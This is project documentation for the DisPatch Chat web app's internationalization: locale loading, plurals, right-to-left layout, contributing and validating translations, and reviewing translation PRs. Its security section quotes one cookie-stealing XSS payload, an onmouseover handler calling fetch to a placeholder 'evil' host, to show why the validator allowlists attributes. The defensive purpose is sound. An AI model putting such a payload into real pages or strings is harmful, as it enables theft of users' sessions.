# Internationalization

DisPatch Chat ships in eight languages. This document covers how the system works,
how to add a language, how to contribute a translation, and how we review
translation contributions.

| Code | Language | Native | Direction |
|---|---|---|---|
| `en` | English | English | LTR |
| `ar` | Arabic | العربية | **RTL** |
| `de` | German | Deutsch | LTR |
| `es` | Spanish | Español | LTR |
| `fr` | French | Français | LTR |
| `ja` | Japanese | 日本語 | LTR |
| `pt` | Portuguese | Português | LTR |
| `zh` | Chinese (Simplified) | 简体中文 | LTR |

## 1. How it works

### The pieces

```
frontend/static/js/i18n.js          the runtime (no dependencies, no build step)
frontend/static/locales/en.json     the source of truth — 512 keys
frontend/static/locales/<lang>.json one per language, same key structure
scripts/check-locales.py            CI validator
```

`en.json` is authoritative. A key exists there first; translations follow.

### Loading

`i18n.js` fetches **two** dictionaries in parallel on boot: the active locale
and `en.json`. English is always resident as the fallback, so a key missing
from `ar.json` renders the English string rather than a blank node or a raw
key. That is what makes partial translations shippable — see §5.

Failure is layered, and no layer is a blank UI:

1. key found in the active locale → use it
2. key missing → fall back to the English dictionary
3. `en.json` itself failed to load → fall back to `CRITICAL_EN`, a ~12-string
   hardcoded map inside `i18n.js` covering "you are offline" and the primary
   buttons
4. still nothing → a humanized form of the key (`files.wipe_confirm` →
   "Wipe confirm"), which is ugly but legible and obviously a bug

There is a fifth safety net that costs nothing: **the static markup in
`index.html` is written in English**, and the DOM pass only ever *replaces*
text. If `i18n.js` never runs at all, the page is the English app it always
was.

### No flash of untranslated content

`bootI18n()` runs at module-evaluation time — before anything renders — and
synchronously stamps `<html lang>` and `<html dir>` from `localStorage`. This
is the same trick the existing no-FOUC theme script in `index.html` uses, and
it matters more for RTL than for theme: a page that paints LTR and then flips
to RTL is a visible, jarring reflow.

The dictionary fetch is awaited by `init()` before the app's first render, and
the existing boot veil covers that window. The fetch is time-boxed to 4s so a
hung request can never hold the veil hostage; if it times out, English wins and
the app boots.

### Translating

```js
import { t } from './i18n.js';

t('composer.send')                            // "Send"
t('welcome.with_bot', { name: 'Nova' })       // "Chat with Nova"
t('files.uploaded', { count: 3 })             // "Uploaded 3 files"
```

`{name}`-style placeholders interpolate from `vars`. Numeric values are run
through `Intl.NumberFormat`, so `1234` renders as `1,234` in English, `1.234`
in German and `1 234` in French with no translator involvement. `#` is a
shorthand for the formatted `count`.

`t()` returns a plain string. Call sites assign it with `textContent`, so there
is no escaping to think about — and no XSS surface. The two exceptions are
documented in §6.

### Plurals

A translatable value is either a string or an object whose keys are **all**
CLDR plural categories. The object form selects on `count` via
`Intl.PluralRules`:

```json
"files.uploaded": {
  "one":   "Uploaded {count} file",
  "other": "Uploaded {count} files"
}
```

Different languages need different category sets, and neither the runtime nor
the call site needs to know which. Japanese and Chinese collapse to a single
`other`. Arabic uses all six:

```json
"files.uploaded": {
  "zero":  "لم يتم رفع أي ملف",
  "one":   "تم رفع ملف واحد",
  "two":   "تم رفع ملفين",
  "few":   "تم رفع {count} ملفات",
  "many":  "تم رفع {count} ملفًا",
  "other": "تم رفع {count} ملف"
}
```

Note that the Arabic `zero`, `one` and `two` forms omit `{count}` entirely —
the noun's own inflection carries the number, and writing "2 ملفين" would be
wrong. `check-locales.py` knows this and permits it for exactly those three
categories.

There are 15 pluralized keys; `check-locales.py --list-plural` prints them, and
`scripts/check-locales.py` is the authority on which categories each language
requires.

### Dates, times and numbers

`i18n.js` replaces the hand-rolled helpers that were in `js/util.js`:

| Helper | Was | Now |
|---|---|---|
| `clockTime` | `toLocaleTimeString('en-US', { hour12: true })` | `Intl.DateTimeFormat` — the locale picks 12h vs 24h, so German and Japanese get `14:34` for free |
| `dayLabel` | `toLocaleDateString('en-US', …)` | `Intl.DateTimeFormat` + translatable `time.today` / `time.yesterday` |
| `relTime` | `"5m"`, `"Yesterday"`, `"Jun 4"` | compact ladder using translatable `time.short.*`, falling back to `Intl.DateTimeFormat` past a week |
| `fmtSize` | `"6.2 MB"` | `Intl.NumberFormat` + translatable `unit.*` (French correctly renders `6,2 Mo`) |

Two additions that need no translation work at all:
`relTimeLong()` (`Intl.RelativeTimeFormat` — "5 minutes ago", "il y a 5
minutes") for tooltips and screen readers, and `fullTimestamp()` for `title`
attributes.

**Numbering systems.** Each locale declares its own BCP-47 tag in `$meta.locale`.
Arabic uses `ar-u-nu-latn` — Western-Arabic digits — deliberately: the app
displays model names, version strings, file sizes and PIN digits, and mixing
Eastern-Arabic numerals into those is worse than useless. If a deployment wants
`٥` instead of `5`, changing `$meta.locale` to `ar` is a one-line, data-only
change requiring no code.

### The static DOM pass

Markup is tagged with attributes and translated in one pass by `applyDom()`:

```html
<h2 data-i18n="settings.title">Settings</h2>
<button data-i18n-attr="title=nav.lock_now;aria-label=nav.lock_now">🔒</button>
<input data-i18n-attr="placeholder=search.placeholder" />
<p data-i18n-html="settings.hint">…</p>
<span data-i18n="files.uploaded" data-i18n-vars='{"count":3}'></span>
```

`data-i18n` writes `textContent`, so put it on a **leaf** element — on a node
with element children it would destroy them. Where a string genuinely carries
inline markup, use `data-i18n-html` (§6).

`applyDom()` runs on boot and again on every language change.

### Right-to-left

RTL is a first-class mode. `setLocale()` sets `<html dir>`, and the CSS uses
logical properties (`margin-inline-start`, `inset-inline-end`,
`text-align: start`) so most of the layout mirrors with no `[dir]` selectors at
all.

A full RTL audit of the stylesheets found 58 issues: 47 were pure in-place
logical-property swaps, 8 needed a small `[dir="rtl"]` override block (mirrored
transforms, directional glyphs, gradient sweeps), and 3 needed an explicit
`direction:`. All of them are fixed; the notes below are the rules that keep
them fixed.

Three things are worth knowing even if you never touch the CSS:

* **Code output stays LTR.** `pre` and code blocks get `direction: ltr`
  unconditionally. Bidi reordering genuinely garbles a shell command line.
* **The PIN keypad stays LTR.** CSS Grid places items along the inline axis, so
  under `dir="rtl"` a 3-column keypad renders `3 2 1 / 6 5 4`. Multi-digit
  numbers are written left-to-right in Arabic too; a mirrored keypad is an
  input-error generator.
* **Centring idioms must not be "fixed".** `left: 50%` paired with
  `translateX(-50%)` is centring, not positioning. Converting it to
  `inset-inline-start` shoves the element fully off-centre in RTL, because
  `transform` is not mirrored by `dir`. The audit lists every such site.

Translators handle one RTL detail themselves: **directional arrows mirror**.
`threads.empty_cta` is "Start your first chat →" in English and
"ابدأ محادثتك الأولى ←" in Arabic. Vertical (`↑ ↓ ▲ ▼`) and semantic
(`⬆` upload, `⤓` import) arrows do not mirror.

## 2. Adding a language

1. Copy the source file:
   ```bash
   cp frontend/static/locales/en.json frontend/static/locales/it.json
   ```
2. Edit `$meta` in the new file:
   ```json
   "$meta": {
     "locale": "it",
     "dir": "ltr",
     "name": "Italian",
     "nativeName": "Italiano",
     "pluralCategories": ["one", "many", "other"]
   }
   ```
   `pluralCategories` must be the CLDR **cardinal** set for the language. The
   validator has a table for 28 languages; if yours is missing, add it to
   `CLDR_CARDINAL` in `scripts/check-locales.py` in the same PR.
3. Register it in `LANGUAGES` in `frontend/static/js/i18n.js` — one line, kept
   in the order a picker should display:
   ```js
   { code: 'it', native: 'Italiano', english: 'Italian', dir: 'ltr' },
   ```
4. Translate the values. Leave every key untouched.
5. Add `/static/locales/it.json` to the `SHELL` precache array in
   `frontend/static/sw.js` and bump the `CACHE` name.
6. Validate:
   ```bash
   python3 scripts/check-locales.py --only it
   ```
7. If the language is right-to-left, add its code to `RTL_LANGS` in **both**
   `i18n.js` and `check-locales.py`, and re-read
   the LTR-island rules below — they
   apply to every RTL language, not just Arabic.

That is the whole procedure. There is no build step, no extraction tool, and no
code generation.

## 3. Contributing a translation

**You do not need to be a programmer, and you do not need to translate
everything.**

1. Fork the repo.
2. Copy `frontend/static/locales/en.json` to `<your-language>.json`, or edit an
   existing file to improve it.
3. Translate the **values** on the right of each colon. Never touch the keys on
   the left.
4. Open a pull request that changes **only your language's file** (plus
   `i18n.js` and `sw.js` if you are adding a brand-new language).

### Rules that matter

**Keep placeholders exactly as written.** `{name}`, `{count}`, `{size}` are
substituted at runtime. You may — and often should — **move** them to fit your
language's word order. You may not rename, translate or delete them.

```json
"welcome.with_bot": "Chat with {name}"     ✅ en
"welcome.with_bot": "{name} とチャット"      ✅ ja — reordered, still {name}
"welcome.with_bot": "Chat with {nombre}"   ❌ renamed — will render literally
```

**Keep emoji and symbols.** `🔒 Lock now` → `🔒 Verrouiller`. The glyph is how
people find the button.

**Mirror directional arrows if your language is RTL.** `→` becomes `←`. Vertical
and semantic arrows (`↑ ⬆ ⤓`) do not change.

**Do not translate these.** They are product names, command syntax or format
masks:

> DisPatch Chat · DisPatch · OpenClaw · YOLO · JSON ·
> Markdown · HTML · `-c` · `--copy` · `provider/model` · `LC-XXXX-XXXX` ·
> `gfx1151` · `.json` · `.bak` · `Ctrl/⌘+F` · VRAM · RAM

**Do translate these.** They describe features, they are not brands:

> Safe Mode · File Server · Companions · Gateway · reaction image ·
> transcript · recovery code · workflow · bot · chat

Pick one term per concept and use it everywhere. "Safe Mode" appearing as three
different phrases across the UI is worse than an imperfect single choice.

**Match the tone.** The English UI is plain, warm and short — informal address,
no corporate register. Use whatever register a good consumer app in your
language would use (`du` in German, `tú` in Spanish, tutoiement in French,
です・ます in Japanese). Prefer what a native speaker would actually see over a
literal gloss.

**Mind the width.** Much of this text sits in tight chrome: a 72px sidebar
rail, a narrow bottom action bar, chips, and a ~40px timestamp column in the
thread list. Where English is one short word, keep yours short. The
`time.short.*` keys in particular must stay abbreviation-length —
Arabic uses `{count} د`, German `{count} Min.`, Chinese `{count}分`.

**Partial translations are welcome.** Any key you leave in English simply
renders in English. Translating the chat path first (`chat`, `threads`,
`composer`, `msg`, `welcome`, `time` — 62 keys) gets you a usable app; the
admin surfaces (`reactions` 70, `harness`) can wait. See §5.

### Check your work

```bash
python3 scripts/check-locales.py --only <lang>
```

Errors must be fixed. Warnings are informational — read them, but several are
legitimate in some languages (a byte-identical value is fine when the word is
the same, and Arabic's `zero`/`one`/`two` forms are supposed to drop the
count).

## 4. Validation and CI

`scripts/check-locales.py` has no dependencies and runs on any Python 3.9+.

**Errors** (fail the build): invalid JSON · missing or malformed `$meta` ·
wrong `dir` for an RTL language · keys missing from a locale · unknown keys ·
type mismatches (string in English, object in the translation) · a plural
missing a required CLDR category, or using a category the language does not
have · a translation introducing a placeholder English does not define · a
non-plural translation dropping one · an HTML-bearing value changing its tag
structure or losing an `id=` · any HTML tag or attribute outside the
allowlist, or a `javascript:`/`data:` URI.

**Warnings** (informational): a plural's `zero`/`one`/`two` form dropping
`{count}` · a value identical to English · a leading glyph missing · all plural
forms identical.

Paste into `.github/workflows/i18n.yml`:

```yaml
name: i18n

on:
  pull_request:
    paths:
      - 'frontend/static/locales/**'
      - 'frontend/static/js/i18n.js'
      - 'scripts/check-locales.py'
  push:
    branches: [main]
    paths:
      - 'frontend/static/locales/**'

jobs:
  locales:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: '3.12'
      - name: Validate locale files
        run: python3 scripts/check-locales.py
```

Under GitHub Actions the script auto-detects `GITHUB_ACTIONS` and emits
`::error file=…` / `::warning file=…` annotations, so problems appear inline on
the PR diff.

**Run it without `--strict` in CI.** `--strict` promotes warnings to failures;
that is a tool for someone auditing a locale file, not a merge gate. Blocking a
PR because a German translator correctly left "Chat" as "Chat" would be
actively harmful.

Optional second job, worth having: spellcheck **`en.json` only**.

```yaml
  spellcheck-source:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: crate-ci/typos@v1
        with:
          files: frontend/static/locales/en.json
```

Never spellcheck the translations — there is no dictionary for them and the
false-positive rate makes the job useless.

## 5. Partial translations

Missing keys fall back to English **per key**, not per file. This is a
deliberate policy choice with two consequences:

* A new English string can ship the moment it is written. It appears in English
  in all eight locales until someone translates it, and nothing breaks.
* Translation completeness is a **report, not a gate**. CI never fails because
  a locale is 60% done.

The tradeoff is that a half-translated screen mixes languages, which looks
sloppy. We accept that, because the alternative — blocking English feature work
on seven translations, or shipping a blank string — is worse. Projects that
gate on completeness generally do so because their i18n layer compiles messages
ahead of time and a missing key is a hard failure. Ours does not.

## 6. Security notes for reviewers

Locale values are **rendered as text** via `textContent` everywhere except two
strings, which use `data-i18n-html` and are injected with `innerHTML`:

* `settings.hint` — the Bot Manager explainer, contains `<strong>` runs
* `security.note` — the Security modal explainer, contains `<br />` and two
  `<code>` elements

This is a real trust boundary. **A translation PR is a code PR for those two
strings**, and unlike code, most reviewers cannot read the content. Two
mitigations are in place:

1. `check-locales.py` enforces a **tag allowlist**
   (`strong em b i code br span kbd small`) on every value in every locale, and
   verifies that the tag multiset is unchanged from English. `<script>`,
   `<img>` and `<a>` are hard errors.
2. It enforces an **attribute allowlist** as well — `class` and `id`, nothing
   else, with values restricted to identifier characters. This is the half that
   matters most and the half that was missing until it was added: a tag-name
   check alone accepts
   `<strong onmouseover="fetch('//evil/'+document.cookie)">Save</strong>`,
   which has the same tag signature as the English string, keeps every id and
   class, and would have passed review as "same markup, translated words".
   `javascript:` / `data:` URIs and unparsable tags are rejected too, and
   `check-locales.py --selftest` runs the payloads as fixtures so the rule
   cannot quietly regress (real locale files are clean, so nothing else in CI
   would notice).
3. It also verifies that `id=` attributes survive translation, because
   `main.js` looks up `#sec-recovery-path` and `#sec-config-path` by id to write
   the real paths into them. A translation that dropped those elements would
   silently break the recovery-path display. Introducing an id or class that
   English does not have is an error in the other direction.

When reviewing a translation diff, additionally check by eye for anything that
looks like a URL, `javascript:`, or markup — in a language you cannot read,
those are still recognisable. This is not paranoia: **Ubuntu 23.10 desktop ISOs
were withdrawn about three hours after release in October 2023** because
crowd-sourced installer translations contained hate speech, attributed by
Canonical to a malicious contributor. That went through a translation platform
rather than a reviewed PR, and the documented base rate of such incidents is
very low — but the cost is high and the check is cheap.

## 7. How translation works for a GitHub project

*Researched and verified 2026-08-03. Prices and eligibility terms change; re-check
before acting on them.*

There are three broad approaches.

### A. Plain pull requests against the JSON files

Contributors edit locale files directly and open a PR. CI validates structure.
Maintainers merge.

Real examples: **Dashy** (`src/assets/locales/*.json`, with the explicit
promise that *"you don't have to translate it all, as any missing attributes
will just fallback to English"*), **Miniflux** (`locale/translations/*.json`,
with the opposite rule — all files must stay synchronized or tests fail),
**Stirling-PDF** (TOML, plus a per-language `ignore_translation.toml` listing
strings that legitimately need no translation so progress stats stay honest),
and **FreshRSS** (a `make i18n-add-language` target that scaffolds a new
language and marks every string `// TODO - Translation` so partial work is
greppable).

### B. A hosted translation platform synced to the repo

Translators work in a web editor; the platform opens PRs (or pushes commits)
with the updated files. Projects that do this usually **forbid** editing locale
files by hand. Uptime Kuma's CONTRIBUTING states it plainly: *"Do not include
any other languages in your initial pull request (even if it is your mother
tongue) to avoid merge conflicts between Weblate and master."*

| | Free for OSS? | Limits | Integration |
|---|---|---|---|
| **Weblate** (Libre plan) | Yes, €0 | 160,000 hosted strings; unlimited translators, projects, components | Git push **or** GitHub pull requests via the Hosted Weblate app |
| **Crowdin** (Open Source licence) | Yes | Pricing page says unlimited projects/strings/members; the OSS page publishes no limits at all | GitHub App creates an `l10n_`-prefixed branch and PR, synced hourly |
| **Transifex** (OSS exception) | Yes, **self-serve** | OSS words don't count against plan limits; no published cap | GitHub integration; Transifex Live unavailable on OSS |
| **Tolgee** | **No OSS program** | Cloud free: 500 keys / 3 seats. Self-hosted free: **10 seats** | — |

Eligibility friction is the real differentiator:

* **Weblate Libre** requires an OSI/FSF-recognised licence, a public repo,
  three months of active development, and **a mention of Weblate in your
  README**. No revenue test.
* **Crowdin OSS** has nine criteria including *"you do not have any commercial
  products related to the open-source project"*, and submitting the form
  commits you to contributing your translations to Crowdin's Global TM.
* **Transifex OSS** is the strictest on paper — *"no funding, revenue, and/or
  commercialization model"* — but the lowest-friction to start: you tick a box
  in project settings rather than joining an approval queue.

Weblate's operational footgun is worth repeating because it bites everyone
once: **never squash-merge a Weblate PR.** Squashing creates a new commit
instead of preserving Weblate's own commits, so Weblate stops recognising that
its work is already upstream and may need a repository reset to recover.

### C. Hybrid

Joplin does app strings by plain PR and documentation via Crowdin. Excalidraw
takes English string changes by PR but requires an issue before a new language
so maintainers can configure it platform-side.

### What we do, and why

**DisPatch uses approach A: plain pull requests plus this repository's own CI
validator.**

For this project specifically:

* **The locale files are the artifact.** No build step means a contributor can
  copy `en.json`, translate it, and open a PR that ships as-is. A platform adds
  a layer between the contributor and the thing that runs.
* **Eight languages is small.** Platforms earn their keep at 20+ locales with
  continuous string churn and a standing translator community. We have neither
  yet.
* **A self-hosted app whose translation pipeline requires a third-party SaaS
  account is a philosophical mismatch** — and a real availability risk. There
  are public reports of Crowdin OSS projects hitting quota errors and
  suspensions despite the "unlimited" billing.
* **Runtime fallback removes the main argument for a platform.** The usual
  reason to centralize is that partial translations are unshippable. Ours are
  shippable by design (§5).

**The tradeoff we are accepting:** review burden lands on maintainers, there is
no translation memory or machine-translation assist, and no built-in way for
two speakers of a language to reach consensus. That gets painful somewhere
around 15+ languages or when translation PRs outpace review.

**The escalation path is Weblate, not Crowdin.** When we outgrow plain PRs, the
move is Hosted Weblate on the Libre plan, configured in **GitHub pull-request
mode** so it never pushes to `main` directly. Two reasons it wins over Crowdin
here: it is GPL-3.0 with no open-core gating, so adopting it commits us to
nothing we cannot walk back by self-hosting the identical software against the
identical files; and its per-language workflow overrides let us require review
**only for the languages no maintainer can read**, which is exactly our review
problem. Crowdin has the better editor and the larger volunteer pool, but the
"no commercial products" clause is a forward risk and the Global TM obligation
gives away work product.

**The concrete trigger to switch:** a second active translator appears for any
one language. That is the point where Weblate's suggestion voting starts
solving a problem we actually have, rather than adding process we don't need.

## 8. Reviewing a translation contribution

The honest position: **maintainers can mechanically verify structure, and
cannot verify meaning.** Say so rather than implying review is thorough.

### What CI verifies for you

Key set · placeholder parity · JSON validity · plural categories correct for
the language · HTML tag AND attribute allowlists, structure, and URI schemes ·
`id=` preservation · type agreement with English. If `check-locales.py` is
green, the file cannot break the app — and cannot script it either.

### What you should check by hand

* **The diff touches one locale file.** A translation PR that also edits
  `main.js` deserves a much closer look.
* **No URLs, `javascript:`, or markup** in the values (§6). Recognisable even
  in a script you cannot read.
* **Glyphs and placeholders survived** in the strings CI only warns about.
* **Width discipline** on the tight strings — `time.short.*`, the sidebar rail
  labels, the harness action bar. Run the app and look.
* **Internal consistency**: does "Safe Mode" get the same rendering everywhere?
  Grep the file for the term you'd expect.

### What you cannot check, and what to do about it

You cannot assess accuracy, register or tone in a language you don't speak.
Options, in order of what we actually do:

1. **Merge on structural correctness and credit the translator.** For a first
   contribution to a language nobody reviews, this is the pragmatic default.
   The failure mode is an awkward translation, which the next speaker of that
   language fixes.
2. **Label the PR `i18n` and ask in the issue for a second speaker** before
   merging. Worth doing for large first-time contributions; not worth blocking
   on indefinitely.
3. **Per-language `CODEOWNERS`** once a language has a trusted regular. Dashy
   does exactly this with a single line (`src/assets/locales/fr.json @EVOTk`).

   ⚠️ **The catch nobody mentions:** GitHub requires code owners to have
   **write permission on the repository**. Adding a volunteer translator as a
   code owner means granting them repo write access. For most projects that
   trade is not worth it, which is why so few actually implement the pattern
   despite it being widely recommended. Add it only when a translator has
   earned write access on other grounds.

A `TRANSLATORS.md` credit list plus an `i18n` label gets most of the social
benefit of per-language ownership at none of the access cost. That is what we
suggest starting with.

**Two things not to do:**

* **Don't promise machine back-translation as a smoke test.** It is a
  frequently-suggested idea that essentially nobody ships, and it produces
  confident nonsense on idiomatic UI strings.
* **Don't pretend you have review coverage you don't.** GitLab — with a paid
  localization team — publicly lists several languages as "Proofreaders
  needed". If they can't staff it, a small project shouldn't imply it has.

## 9. Known gaps

Tracked honestly rather than quietly:

1. **42 server-supplied error strings are not translatable.** The backend
   raises `HTTPException(status, "English prose")` and the frontend shows it
   verbatim in a toast. The recommended fix is to attach a stable machine
   code to each exception so the frontend can look up `t('server.<code>')`.
2. **Two strings in `markdown.js`** (`aria-label="Copy code"` and
   `title="View raw"`) are built inside HTML string concatenation and still
   need `t()` threaded through.
3. **`manifest.webmanifest`** is fetched once at install time and cannot switch
   language live. Only `description` is really prose.
4. **`sw.js` does not precache the locale files** — add them so a locale load
   cannot fail offline.
